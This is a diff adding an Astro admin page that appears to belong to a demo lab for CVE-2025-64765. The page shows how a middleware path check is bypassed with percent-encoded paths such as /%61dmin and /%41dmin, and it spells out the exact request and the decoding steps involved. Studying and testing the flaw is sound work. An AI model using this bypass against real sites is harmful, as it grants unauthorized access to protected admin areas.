@@ -1,0 +1,83 @@
+---
+// Protected admin page — should be blocked by middleware
+// But accessible via /%61dmin (CVE-2025-64765)
+const pathname = Astro.url.pathname;
+const isDirectAccess = pathname === '/admin';
+const isBypass = pathname.includes('%61') || pathname.includes('%41');
+---
+
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Admin Panel — Astro CSPT</title>
+  </head>
+  <body style="margin:0;padding:2rem;font-family:monospace;background:#0d0d0d;color:#ccc;max-width:700px;">
+
+    <p style="color:#888;margin-bottom:0.5rem;"><a href="/" style="color:#888;">← index</a></p>
+    <h1 style="color:#f44;">Admin Panel — Accessed!</h1>
+
+    <!-- BOX 1: SOURCE -->
+    <div style="background:#1a1a1a;border:1px solid #333;border-radius:6px;padding:1rem;margin-bottom:1rem;">
+      <div style="color:#888;font-size:0.8rem;margin-bottom:4px;">SOURCE</div>
+      <code style="color:#f90;">Astro.url.pathname (middleware check)</code>
+      <div style="color:#888;font-size:0.75rem;margin-top:4px;">
+        Middleware checks: <code>context.url.pathname.startsWith('/admin')</code>
+      </div>
+    </div>
+
+    <!-- BOX 2: RAW VALUE -->
+    <div style={`background:#1a1a1a;border:1px solid ${isBypass ? '#f44' : '#555'};border-radius:6px;padding:1rem;margin-bottom:1rem;`}>
+      <div style="color:#888;font-size:0.8rem;margin-bottom:4px;">RAW VALUE (pathname seen by middleware)</div>
+      <code style={`color:${isBypass ? '#f44' : '#4a4'};font-size:1.1rem;`}>
+        pathname = {JSON.stringify(pathname)}
+      </code>
+      <div style={`color:${isBypass ? '#f44' : '#888'};font-size:0.8rem;margin-top:6px;`}>
+        {isBypass
+          ? 'CVE-2025-64765 BYPASS: %61 decoded to "a" after middleware ran. Middleware saw /%61dmin (not /admin) and allowed the request.'
+          : isDirectAccess
+          ? 'Direct /admin access — middleware should have blocked this. If you see this, middleware is misconfigured.'
+          : 'Accessing admin page'}
+      </div>
+    </div>
+
+    <!-- BOX 3: FETCH URL CONSTRUCTED -->
+    <div style="background:#1a1a1a;border:1px solid #f44;border-radius:6px;padding:1rem;margin-bottom:1rem;">
+      <div style="color:#888;font-size:0.8rem;margin-bottom:4px;">HOW THE BYPASS WORKS</div>
+      <code style="color:#f44;font-size:0.9rem;">
+        Request: GET /%61dmin HTTP/1.1
+        <br/>
+        Middleware pathname check: "/%61dmin".startsWith("/admin") = false → ALLOWED
+        <br/>
+        Astro router: decodeURI("/%61dmin") = "/admin" → ROUTES TO /admin PAGE
+      </code>
+      <div style="color:#888;font-size:0.8rem;margin-top:6px;">
+        Why %2F doesn't work: decodeURI() preserves %2F (reserved), so /%2Fadmin still looks like /%2Fadmin to both middleware AND Astro — it would 404.
+        But %61 is not a reserved char, so decodeURI() decodes it to 'a', and the route resolves.
+      </div>
+    </div>
+
+    <!-- BOX 4: RESULT -->
+    <div style="background:#1a1a1a;border:1px solid #f44;border-radius:6px;padding:1rem;">
+      <div style="color:#888;font-size:0.8rem;margin-bottom:4px;">RESULT — You accessed the admin panel</div>
+      <div style="color:#f44;padding:0.5rem;border:1px solid #f44;border-radius:4px;">
+        SENSITIVE ADMIN CONTENT — This page was protected by middleware, but the encoding bypass allowed access.
+      </div>
+      <div style="color:#888;font-size:0.8rem;margin-top:8px;">
+        Accessed via: <code style="color:#f90;">{pathname}</code>
+      </div>
+    </div>
+
+    <div style="margin-top:1.5rem;padding:0.75rem;background:#111;border-radius:6px;border:1px solid #222;">
+      <p style="margin:0;color:#888;font-size:0.8rem;">
+        <strong style="color:#f44;">CVE-2025-64765 Test:</strong>
+        <br/>
+        <a href="/admin" style="color:#4a4;">/admin</a> — Direct access (should be blocked — 403)
+        <br/>
+        <a href="/%61dmin" style="color:#f44;">/%61dmin</a> — Bypass via letter encoding (%61 = a)
+        <br/>
+        <a href="/%41dmin" style="color:#f90;">/%41dmin</a> — Uppercase A encoding (%41 = A) — depends on case sensitivity
+      </p>
+    </div>
+
+  </body>
+</html>
